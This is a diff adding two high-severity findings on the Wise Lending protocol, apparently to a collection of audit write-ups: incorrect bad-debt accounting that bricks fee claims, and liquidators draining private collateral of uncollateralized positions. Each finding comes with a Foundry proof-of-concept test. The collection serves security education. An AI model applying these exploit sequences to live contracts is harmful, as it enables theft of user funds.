@@ -569,3 +569,359 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
 ```
 
 </details>
+
+## 6. [High] Incorrect bad debt accounting can lead to a state where the claimFeesBeneficial function is permanently bricked and no new incentives can be distributed, potentially locking pending and future protocol fees in the FeeManager contract
+
+### Bad Debt & incentives
+
+- Summary: Fees go to `FeeManager`, but incentives are only distributed if there's no global bad debt. Beneficials can claim fees, but not when there's bad debt. If a position undergoes multiple partial liquidations, each incrementing `totalBadDebtETH`, but only the most recent bad debt is recorded for the position, causing an imbalance. While paying back bad debt is possible, it's capped at the recorded amount for the position, leaving excess bad debt in totalBadDebtETH permanently. Thus, this bad debt can become permanent due to partial liquidations, blocking fee claims and incentive distributions.
+
+- Impact & Recommendation: In `WiseSecurity::checkBadDebtLiquidation`, it's advisable to update totalBadDebtETH by the difference between the previous and new bad debt of a position, aligning with the logic in `FeeManagerHelper::_updateUserBadDebt`.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-wise-lending#h-03-incorrect-bad-debt-accounting-can-lead-to-a-state-where-the-claimfeesbeneficial-function-is-permanently-bricked-and-no-new-incentives-can-be-distributed-potentially-locking-pending-and-future-protocol-fees-in-the-feemanager-contract) & [Report](https://code4rena.com/reports/2024-02-wise-lending)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+    // SPDX-License-Identifier: -- WISE --
+    pragma solidity =0.8.24;
+    import "./WiseLendingBaseDeployment.t.sol";
+    contract BadDebtTest is BaseDeploymentTest {
+        address borrower = address(0x01010101);
+        address lender = address(0x02020202);
+        uint256 depositAmountETH = 10e18; // 10 ether
+        uint256 depositAmountToken = 10; // 10 ether
+        uint256 borrowAmount = 5e18; // 5 ether
+        uint256 nftIdLiquidator; // nftId of lender
+        uint256 nftIdLiquidatee; // nftId of borrower
+        uint256 debtShares;
+        function _setupIndividualTest() internal override {
+            _deployNewWiseLending(false);
+            // set token value for simple calculations
+            MOCK_CHAINLINK_2.setValue(1 ether); // 1 token == 1 ETH
+            assertEq(MOCK_CHAINLINK_2.latestAnswer(), MOCK_CHAINLINK_ETH_ETH.latestAnswer());
+            vm.stopPrank();
+
+            // fund lender and borrower
+            vm.deal(lender, depositAmountETH);
+            deal(address(MOCK_WETH), lender, depositAmountETH);
+            deal(address(MOCK_ERC20_2), borrower, depositAmountToken * 2);
+        }
+        function testScenario1() public {
+            // --- scenario is set up --- //
+            _setUpScenario();
+            // --- shortfall event/crash creates bad debt, position partially liquidated logging bad debt --- //
+            _marketCrashCreatesBadDebt();
+            // --- borrower gets partially liquidated again --- //
+            vm.prank(lender);
+            LENDING_INSTANCE.liquidatePartiallyFromTokens(
+                nftIdLiquidatee,
+                nftIdLiquidator,
+                address(MOCK_WETH),
+                address(MOCK_ERC20_2),
+                debtShares * 2e16 / 1e18
+            );
+            // --- global bad det increases again, but user bad debt is set to current bad debt created --- //
+            uint256 newTotalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();
+            uint256 newUserBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);
+
+            assertGt(newUserBadDebt, 0); // userBadDebt reset to new bad debt, newUserBadDebt == current_bad_debt_created
+            assertGt(newTotalBadDebt, newUserBadDebt); // global bad debt incremented again
+            // newTotalBadDebt = old_global_bad_debt + current_bad_debt_created
+
+            // --- user bad debt is paid off, but global bad is only partially paid off (remainder is fake debt) --- //
+            _tryToPayBackGlobalDebt();
+            // --- protocol fees can no longer be claimed since totalBadDebtETH will remain > 0 --- //
+            vm.expectRevert(bytes4(keccak256("ExistingBadDebt()")));
+            FEE_MANAGER_INSTANCE.claimFeesBeneficial(address(0), 0);
+        }
+        function testScenario2() public {
+            // --- scenario is set up --- //
+            _setUpScenario();
+            // --- shortfall event/crash creates bad debt, position partially liquidated logging bad debt --- //
+            _marketCrashCreatesBadDebt();
+
+            // --- Position manipulated so second partial liquidation results in totalBorrow == bareCollateral --- //
+            // borrower adds collateral
+            vm.prank(borrower);
+            LENDING_INSTANCE.solelyDeposit(
+                nftIdLiquidatee,
+                address(MOCK_ERC20_2),
+                6
+            );
+            // borrower gets partially liquidated again
+            vm.prank(lender);
+            LENDING_INSTANCE.liquidatePartiallyFromTokens(
+                nftIdLiquidatee,
+                nftIdLiquidator,
+                address(MOCK_WETH),
+                address(MOCK_ERC20_2),
+                debtShares * 2e16 / 1e18
+            );
+
+            uint256 collateral = SECURITY_INSTANCE.overallETHCollateralsBare(nftIdLiquidatee);
+            uint256 debt = SECURITY_INSTANCE.overallETHBorrowBare(nftIdLiquidatee);
+            assertEq(collateral, debt); // LTV == 100% exactly
+            // --- global bad debt is unchanged, while user bad debt is reset to 0 --- //
+            uint256 newTotalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();
+            uint256 newUserBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);
+            assertEq(newUserBadDebt, 0); // user bad debt reset to 0
+            assertGt(newTotalBadDebt, 0); // global bad debt stays the same (fake debt)
+            // --- attempts to pay back fake global debt result in a noop, totalBadDebtETH still > 0 --- //
+            uint256 paybackShares = _tryToPayBackGlobalDebt();
+
+            assertEq(LENDING_INSTANCE.userBorrowShares(nftIdLiquidatee, address(MOCK_WETH)), paybackShares); // no shares were paid back
+            // --- protocol fees can no longer be claimed since totalBadDebtETH will remain > 0 --- //
+            vm.expectRevert(bytes4(keccak256("ExistingBadDebt()")));
+            FEE_MANAGER_INSTANCE.claimFeesBeneficial(address(0), 0);
+        }
+        function _setUpScenario() internal {
+            // lender supplies ETH
+            vm.startPrank(lender);
+            nftIdLiquidator = POSITION_NFTS_INSTANCE.mintPosition();
+            LENDING_INSTANCE.depositExactAmountETH{value: depositAmountETH}(nftIdLiquidator);
+            vm.stopPrank();
+            // borrower supplies collateral token and borrows ETH
+            vm.startPrank(borrower);
+            MOCK_ERC20_2.approve(address(LENDING_INSTANCE), depositAmountToken * 2);
+            nftIdLiquidatee = POSITION_NFTS_INSTANCE.mintPosition();
+
+            LENDING_INSTANCE.solelyDeposit( // supply collateral
+                nftIdLiquidatee,
+                address(MOCK_ERC20_2),
+                depositAmountToken
+            );
+            debtShares = LENDING_INSTANCE.borrowExactAmountETH(nftIdLiquidatee, borrowAmount); // borrow ETH
+            vm.stopPrank();
+        }
+        function _marketCrashCreatesBadDebt() internal {
+            // shortfall event/crash occurs
+            vm.prank(MOCK_DEPLOYER);
+            MOCK_CHAINLINK_2.setValue(0.3 ether);
+            // borrower gets partially liquidated
+            vm.startPrank(lender);
+            MOCK_WETH.approve(address(LENDING_INSTANCE), depositAmountETH);
+            LENDING_INSTANCE.liquidatePartiallyFromTokens(
+                nftIdLiquidatee,
+                nftIdLiquidator,
+                address(MOCK_WETH),
+                address(MOCK_ERC20_2),
+                debtShares * 2e16 / 1e18 + 1
+            );
+            vm.stopPrank();
+            // global and user bad debt is increased
+            uint256 totalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();
+            uint256 userBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);
+            assertGt(totalBadDebt, 0);
+            assertGt(userBadDebt, 0);
+            assertEq(totalBadDebt, userBadDebt); // user bad debt and global bad debt are the same
+        }
+        function _tryToPayBackGlobalDebt() internal returns (uint256 paybackShares) {
+            // lender attempts to pay back global debt
+            paybackShares = LENDING_INSTANCE.userBorrowShares(nftIdLiquidatee, address(MOCK_WETH));
+            uint256 paybackAmount = LENDING_INSTANCE.paybackAmount(address(MOCK_WETH), paybackShares);
+            vm.startPrank(lender);
+            MOCK_WETH.approve(address(FEE_MANAGER_INSTANCE), paybackAmount);
+
+            FEE_MANAGER_INSTANCE.paybackBadDebtNoReward(
+                nftIdLiquidatee,
+                address(MOCK_WETH),
+                paybackShares
+            );
+            vm.stopPrank();
+            // global bad debt and user bad debt updated
+            uint256 finalTotalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();
+            uint256 finalUserBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);
+            assertEq(finalUserBadDebt, 0); // user has no more bad debt, all paid off
+            assertGt(finalTotalBadDebt, 0); // protocol still thinks there is bad debt
+        }
+    }
+
+  ```
+
+  </details>
+
+## 7. [High] Liquidators can pay less than required to completely liquidate the private collateral balance of an uncollateralized position
+
+### Check uncollateralized positionPrivate
+
+- Summary: users can choose to collateralize or uncollateralize their positions. During liquidation, the liquidator's receive amount is calculated as a percentage of the full collateral, which includes the user's private deposit. However, the reduction of the user's normal balance doesn't account for whether the position is uncollateralized, so that the liquidator can drain the user's private collateral while paying for only a portion of the liquidation, resulting in financial losses for the user and an increase in bad debt for the protocol.
+
+- Impact & Recommendation: Move the uncollateralized position check to an earlier stage in the `calculateReceiveAmount()` function to prevent incorrect deductions from the normal balance during liquidation.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-wise-lending#h-04-liquidators-can-pay-less-than-required-to-completely-liquidate-the-private-collateral-balance-of-an-uncollateralized-position) & [Report](https://code4rena.com/reports/2024-02-wise-lending)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+    pragma solidity =0.8.24;
+    import "forge-std/Test.sol";
+    import {WiseLending, PoolManager} from "./WiseLending.sol";
+    import {TesterWiseOracleHub} from "./WiseOracleHub/TesterWiseOracleHub.sol";
+    import {PositionNFTs} from "./PositionNFTs.sol";
+    import {WiseSecurity} from "./WiseSecurity/WiseSecurity.sol";
+    import {AaveHub} from "./WrapperHub/AaveHub.sol";
+    import {Token} from "./Token.sol";
+    import {TesterChainlink} from "./TesterChainlink.sol";
+    import {IPriceFeed} from "./InterfaceHub/IPriceFeed.sol";
+    import {IERC20} from "./InterfaceHub/IERC20.sol";
+    import {IWiseLending} from "./InterfaceHub/IWiseLending.sol";
+    import {ContractLibrary} from "./PowerFarms/PendlePowerFarmController/ContractLibrary.sol";
+    contract WiseLendingTest is Test, ContractLibrary {
+    WiseLending wiseLending;
+    TesterWiseOracleHub oracleHub;
+    PositionNFTs positionNFTs;
+    WiseSecurity wiseSecurity;
+    AaveHub aaveHub;
+    TesterChainlink wbtcOracle;
+    // users/admin
+    address alice = address(1);
+    address bob = address(2);
+    address charles = address(3);
+    address lendingMaster;
+    //tokens
+    address wbtc;
+    function setUp() public {
+        lendingMaster = address(11);
+        vm.startPrank(lendingMaster);
+        address ETH_PRICE_FEED = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
+        address UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
+        address AAVE_ADDRESS = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
+
+        // deploy oracle hub
+        oracleHub = new TesterWiseOracleHub(
+        WETH,
+        ETH_PRICE_FEED,
+        UNISWAP_V3_FACTORY
+        );
+        oracleHub.setHeartBeat(
+        oracleHub.ETH_USD_PLACEHOLDER(), // set USD/ETH feed heartbeat
+        1
+        );
+        // deploy position NFT
+        positionNFTs = new PositionNFTs(
+            "PositionsNFTs",
+            "POSNFTS",
+            "app.wisetoken.net/json-data/nft-data/"
+        );
+        // deploy Wiselending contract
+        wiseLending = new WiseLending(
+        lendingMaster,
+        address(oracleHub),
+        address(positionNFTs)
+        );
+        // deploy AaveHub
+        aaveHub = new AaveHub(
+        lendingMaster,
+        AAVE_ADDRESS,
+        address(wiseLending)
+        );
+
+        // deploy Wisesecurity contract
+        wiseSecurity = new WiseSecurity(
+        lendingMaster,
+        address(wiseLending),
+        address(aaveHub)
+        );
+        wiseLending.setSecurity(address(wiseSecurity));
+        // set labels
+        vm.label(address(wiseLending), "WiseLending");
+        vm.label(address(positionNFTs), "PositionNFTs");
+        vm.label(address(oracleHub), "OracleHub");
+        vm.label(address(wiseSecurity), "WiseSecurity");
+        vm.label(alice, "Alice");
+        vm.label(bob, "Bob");
+        vm.label(charles, "Charles");
+        vm.label(wbtc, "WBTC");
+        vm.label(WETH, "WETH");
+        // create tokens, create TestChainlink oracle, add to oracleHub
+        (wbtc, wbtcOracle) = _setupToken(18, 17 ether);
+        oracleHub.setHeartBeat(wbtc, 1);
+        wbtcOracle.setRoundData(0, block.timestamp -1);
+        // setup WETH on oracle hub
+        oracleHub.setHeartBeat(WETH, 60 minutes);
+        oracleHub.addOracle(WETH, IPriceFeed(ETH_PRICE_FEED), new address[](0));
+
+        // create pools
+        wiseLending.createPool(
+        PoolManager.CreatePool({
+            allowBorrow: true,
+            poolToken: wbtc, // btc
+            poolMulFactor: 17500000000000000,
+            poolCollFactor: 805000000000000000,
+            maxDepositAmount: 1800000000000000000000000
+        })
+        );
+        wiseLending.createPool(
+        PoolManager.CreatePool({
+            allowBorrow: true,
+            poolToken: WETH, // btc
+            poolMulFactor: 17500000000000000,
+            poolCollFactor: 805000000000000000,
+            maxDepositAmount: 1800000000000000000000000
+        })
+        );
+    }
+    function _setupToken(uint decimals, uint value) internal returns (address token, TesterChainlink oracle) {
+        Token _token = new Token(uint8(decimals), alice); // deploy token
+        TesterChainlink _oracle = new TesterChainlink( // deploy oracle
+        value, 18
+        );
+        oracleHub.addOracle( // add oracle to oracle hub
+        address(_token),
+        IPriceFeed(address(_oracle)),
+        new address[](0)
+        );
+        return (address(_token), _oracle);
+    }
+    function testStealPureBalance() public {
+        // deposit WETH in private and public balances for Alice's NFT
+        vm.startPrank(alice);
+        deal(WETH, alice, 100 ether);
+        IERC20(WETH).approve(address(wiseLending), 100 ether);
+        uint aliceNft = positionNFTs.reservePosition();
+        wiseLending.depositExactAmount(aliceNft, WETH, 50 ether);
+        wiseLending.solelyDeposit(aliceNft, WETH, 50 ether);
+
+        // deposit for Bob's NFT to provide WBTC liquidity
+        vm.startPrank(bob);
+        deal(wbtc, bob, 100 ether);
+        IERC20(wbtc).approve(address(wiseLending), 100 ether);
+        wiseLending.depositExactAmountMint(wbtc, 100 ether);
+        // Uncollateralize Alice's NFT position to allow only private(pure)
+        // balance to be used as collateral
+        vm.startPrank(alice);
+        wiseLending.unCollateralizeDeposit(aliceNft, WETH);
+        (, , uint lendCollFactor) = wiseLending.lendingPoolData(WETH);
+        uint usableCollateral = 50 ether *  lendCollFactor * 95e16 / 1e36 ;
+
+        // alice borrows
+        uint borrowable = oracleHub.getTokensFromETH(wbtc, usableCollateral) - 1000;
+        uint paybackShares = wiseLending.borrowExactAmount(aliceNft, wbtc, borrowable);
+        vm.startPrank(lendingMaster);
+        // increase the price of WBTC to make Alice's position liquidatable
+        wbtcOracle.setValue(20 ether);
+
+        // let charles get WBTC to liquidate Alice
+        vm.startPrank(charles);
+        uint charlesNft  = positionNFTs.reservePosition();
+        uint paybackAmount = wiseLending.paybackAmount(wbtc, paybackShares);
+        deal(wbtc, charles, paybackAmount);
+        IERC20(wbtc).approve(address(wiseLending), paybackAmount);
+        uint wbtcBalanceBefore = IERC20(wbtc).balanceOf(charles);
+        uint wethBalanceBefore = IERC20(WETH).balanceOf(charles);
+        // charles liquidates 40% of the shares to ensure he can reduce the pure collateral balance twice
+        wiseLending.liquidatePartiallyFromTokens(aliceNft, charlesNft, wbtc, WETH, paybackShares * 40e16/1e18);
+        uint wbtcBalanceChange = wbtcBalanceBefore - IERC20(wbtc).balanceOf(charles);
+        uint wethBalanceChange = IERC20(WETH).balanceOf(charles) - wethBalanceBefore;
+
+        // The amount of WETH Charles got is 2x the amount of WBTC he paid plus fees (10% of amount paid)
+        // WBTC paid plus fees = 110% * wbtcBalanceChange
+        // x2WBTCChangePlusFees = 2 * WBTC paid plus fees
+        uint x2WBTCChangePlusFees = oracleHub.getTokensInETH(wbtc, 11e17 * wbtcBalanceChange / 1e18) * 2;
+
+        assertApproxEqAbs(wethBalanceChange, x2WBTCChangePlusFees, 200);
+    }
+    }
+
+  ```
+
+  </details>
